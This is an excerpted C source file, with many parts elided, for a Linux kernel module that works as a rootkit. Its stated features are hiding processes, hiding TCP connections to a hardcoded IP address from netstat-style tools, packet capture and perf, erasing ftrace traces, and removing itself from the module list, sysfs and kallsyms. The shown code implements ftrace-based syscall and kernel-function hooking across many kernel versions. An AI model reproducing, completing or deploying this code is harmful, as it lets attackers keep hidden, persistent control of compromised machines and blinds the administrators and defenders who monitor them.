 ...
 * combined_module.c
 *
 * Unified LKM — portable across Ubuntu, CentOS/RHEL, Debian, Rocky, Alma
 * Kernel support: 4.17+ (x86_64)
 *
 *   1) Process hiding  — getdents64/getdents/kill syscall hooks
 *   2) TCP conn hiding — tcp4_seq_show, tcp_diag, packet_rcv, tcp_set_state,
 *                         perf_event_output, tcp_v4_connect observer
 *   3) enabled_functions hiding — dyn_ftrace FL_ENABLED flag clearing
 *   4) Module self-hiding — sysfs/list/kallsyms wipe (deferred)
 */
...
/*
 * CRITICAL: Prevent tail-call optimization.
 * Without this, GCC turns the last CALL in hook functions into JMP,
 * corrupting parent_ip and causing infinite recursion.
 */
...
#define HIDDEN_IP   "103.91.140.22"
#define MATCH_MODE  0
...
/* ================================================================
 * PORTABLE FTRACE COMPAT
 *
 * Era 1 (< 5.11): callback gets struct pt_regs * directly
 * Era 2 (5.11+): callback gets struct ftrace_regs *
 *   On x86_64: struct ftrace_regs { struct pt_regs regs; }
 *   ftrace_get_regs() returns NULL on RHEL (cs==0 issue)
 *   Solution: access fregs->regs directly
 * ================================================================ */

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define COMPAT_FTRACE_REGS_IS_PTREGS 1
#endif

/* Recursion flag compat */
#ifdef FTRACE_OPS_FL_RECURSION
#define COMPAT_RECURSION_FLAG 0
#elif defined(FTRACE_OPS_FL_RECURSION_SAFE)
#define COMPAT_RECURSION_FLAG FTRACE_OPS_FL_RECURSION_SAFE
#else
#define COMPAT_RECURSION_FLAG 0
#endif
...
#ifdef FTRACE_OPS_FL_IPMODIFY
#define COMPAT_IPMODIFY_FLAG FTRACE_OPS_FL_IPMODIFY
#else
#define COMPAT_IPMODIFY_FLAG 0
#endif

/* copy_from_kernel_nofault was probe_kernel_read before 5.8 */
...
/* Cache module text range at init — survives module list unlinking */


static inline bool parent_is_self(unsigned long parent_ip)
{
    return within_module(parent_ip, THIS_MODULE);
}

#ifdef COMPAT_FTRACE_REGS_IS_PTREGS
                                        ...
                                        struct ftrace_ops *op, struct ftrace_regs *fregs)
{
    ...
    if (!parent_is_self(parent_ip))
        ...
        arch_ftrace_regs(fregs)->regs.ip = (unsigned long)hook->hook_func;
#else
        fregs->regs.ip = (unsigned long)hook->hook_func;
#endif
}
#endif
static int install_hook(struct ftrace_hook *hook)
{
    ...
    *((unsigned long *)hook->orig_func) = hook->addr;
    ...
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | COMPAT_IPMODIFY_FLAG
                    | COMPAT_RECURSION_FLAG;
...
/* ================================================================
 * TCP HIDING — Hidden TID tracking
 * ================================================================ */
    ...
    struct ftrace_ops *ops, struct pt_regs *regs)
{
    ...
    if (!regs) return;
    if (parent_is_self(parent_ip)) return;
...
{
    struct sockaddr_in sin;
    unsigned long si_val;

    if (parent_is_self(parent_ip)) return;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,13,0)
    si_val = arch_ftrace_regs(fregs)->regs.si;
#else
    si_val = fregs->regs.si;
#endif

    if (copy_from_kernel_nofault(&sin, (void *)si_val, sizeof(sin)) == 0) {
        if (sin.sin_family == AF_INET &&
            should_hide(ntohs(sin.sin_port), sin.sin_addr.s_addr)) {
            htid_add(current->pid);
        }
...
static int install_observer(void)
{
    ...
    observer_ops.flags = FTRACE_OPS_FL_SAVE_REGS | COMPAT_RECURSION_FLAG;
...
/* ================================================================
 * TCP HIDING — Hook implementations
 * ================================================================ */
...
static struct ftrace_hook th_hooks[] = {
    TH("tcp4_seq_show",      hook_tcp4_seq_show,      &orig_tcp4_seq_show),
    TH("tcp_diag_dump",      hook_tcp_diag_dump,      &orig_tcp_diag_dump),
    TH("tcp_diag_dump_one",  hook_tcp_diag_dump_one,  &orig_tcp_diag_dump_one),
    TH("tpacket_rcv",        hook_tpacket_rcv,        &orig_tpacket_rcv),
    TH("packet_rcv",         hook_packet_rcv,         &orig_packet_rcv),
    TH("tcp_set_state",      hook_tcp_set_state,      &orig_tcp_set_state),
    TH("perf_event_output",  hook_perf_event_output,  &orig_perf_event_output),
};
...
#endif
#ifndef FTRACE_FL_TOUCHED
#define FTRACE_FL_TOUCHED   (1UL << 20)
#endif
...
static int __init combined_init(void)
{
    ...
    /* Cache module text range BEFORE anything else.
     * Survives module list unlinking for parent_is_self(). */
...
{
    cancel_delayed_work_sync(&hide_self_work);
    ef_remove();
    th_exit();
